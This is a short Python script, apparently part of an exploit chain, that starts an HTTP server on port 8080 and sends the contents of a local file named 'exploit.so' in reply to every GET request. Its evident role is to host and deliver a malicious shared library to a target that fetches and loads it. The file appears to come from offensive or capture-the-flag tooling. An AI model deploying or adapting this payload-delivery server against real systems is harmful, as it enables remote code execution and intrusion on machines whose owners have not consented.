#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer


class MyHTTPServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        with open("exploit.so", "rb") as lib:
            self.wfile.write(lib.read())


HTTPServer(("", 8080), MyHTTPServer).serve_forever()   

